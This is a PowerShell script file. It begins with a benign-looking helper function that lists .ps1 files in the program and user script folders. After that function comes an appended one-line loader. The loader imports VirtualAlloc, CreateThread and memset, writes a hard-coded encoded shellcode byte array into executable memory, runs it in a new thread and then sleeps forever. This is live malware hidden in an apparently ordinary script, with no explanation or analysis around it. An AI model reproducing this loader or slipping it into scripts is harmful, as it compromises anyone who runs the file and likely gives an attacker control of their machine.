function Get-AvailableScriptFilePath
{
    [CmdletBinding(PositionalBinding=$false)]
    Param
    (
        [Parameter()]
        [string]
        $Name
    )

    $scriptInfo = $null
    $scriptFileName = '*.ps1'
    $scriptBasePaths = @($script:ProgramFilesScriptsPath, $script:MyDocumentsScriptsPath)
    $scriptFilePaths = @()
    $wildcardPattern = $null

    if($Name)
    {
        if(Test-WildcardPattern -Name $Name)
        {
            $wildcardPattern = New-Object System.Management.Automation.WildcardPattern $Name,$script:wildcardOptions
        }
        else
        {
            $scriptFileName = "$Name.ps1"
        }

    }

    foreach ($location in $scriptBasePaths)
    {
        $scriptFiles = Get-ChildItem -Path $location `
                                     -Filter $scriptFileName `
                                     -ErrorAction SilentlyContinue `
                                     -WarningAction SilentlyContinue

        if($wildcardPattern)
        {
            $scriptFiles | Microsoft.PowerShell.Core\ForEach-Object {
                                if($wildcardPattern.IsMatch($_.BaseName))
                                {
                                    $scriptFilePaths += $_.FullName
                                }
                           }
        }
        else
        {
            $scriptFiles | Microsoft.PowerShell.Core\ForEach-Object { $scriptFilePaths += $_.FullName }
        }
    }

    return $scriptFilePaths
}
$0iVu = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0iVu -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcb,0xba,0x14,0x05,0x01,0x6b,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0xe8,0xe7,0xf4,0x97,0xf8,0x6a,0xf6,0x67,0xf8,0x0a,0x7e,0x82,0xc9,0x0a,0xe4,0xc6,0x79,0xbb,0x6e,0x8a,0x75,0x30,0x22,0x3f,0x0e,0x34,0xeb,0x30,0xa7,0xf3,0xcd,0x7f,0x38,0xaf,0x2e,0xe1,0xba,0xb2,0x62,0xc1,0x83,0x7c,0x77,0x00,0xc4,0x61,0x7a,0x50,0x9d,0xee,0x29,0x45,0xaa,0xbb,0xf1,0xee,0xe0,0x2a,0x72,0x12,0xb0,0x4d,0x53,0x85,0xcb,0x17,0x73,0x27,0x18,0x2c,0x3a,0x3f,0x7d,0x09,0xf4,0xb4,0xb5,0xe5,0x07,0x1d,0x84,0x06,0xab,0x60,0x29,0xf5,0xb5,0xa5,0x8d,0xe6,0xc3,0xdf,0xee,0x9b,0xd3,0x1b,0x8d,0x47,0x51,0xb8,0x35,0x03,0xc1,0x64,0xc4,0xc0,0x94,0xef,0xca,0xad,0xd3,0xa8,0xce,0x30,0x37,0xc3,0xea,0xb9,0xb6,0x04,0x7b,0xf9,0x9c,0x80,0x20,0x59,0xbc,0x91,0x8c,0x0c,0xc1,0xc2,0x6f,0xf0,0x67,0x88,0x9d,0xe5,0x15,0xd3,0xc9,0xca,0x17,0xec,0x09,0x45,0x2f,0x9f,0x3b,0xca,0x9b,0x37,0x77,0x83,0x05,0xcf,0x78,0xbe,0xf2,0x5f,0x87,0x41,0x03,0x49,0x43,0x15,0x53,0xe1,0x62,0x16,0x38,0xf1,0x8b,0xc3,0xd5,0xf4,0x1b,0x2c,0x81,0xf6,0xff,0xc4,0xd0,0xf8,0xfa,0x2d,0x5c,0x1e,0x54,0x1e,0x0e,0x8f,0x14,0xce,0xee,0x7f,0xfc,0x04,0xe1,0xa0,0x1c,0x27,0x2b,0xc9,0xb6,0xc8,0x82,0xa1,0x2e,0x70,0x8f,0x3a,0xcf,0x7d,0x05,0x47,0xcf,0xf6,0xaa,0xb7,0x81,0xfe,0xc7,0xab,0x75,0x0f,0x92,0x96,0xd3,0x10,0x08,0xbc,0xdb,0x84,0xb7,0x17,0x8c,0x30,0xba,0x4e,0xfa,0x9e,0x45,0xa5,0x71,0x16,0xd0,0x06,0xed,0x57,0x34,0x87,0xed,0x01,0x5e,0x87,0x85,0xf5,0x3a,0xd4,0xb0,0xf9,0x96,0x48,0x69,0x6c,0x19,0x39,0xde,0x27,0x71,0xc7,0x39,0x0f,0xde,0x38,0x6c,0x91,0x22,0xef,0x48,0xe7,0x4a,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Sae=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Sae.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Sae,0,0,0);for (;;){Start-sleep 60};
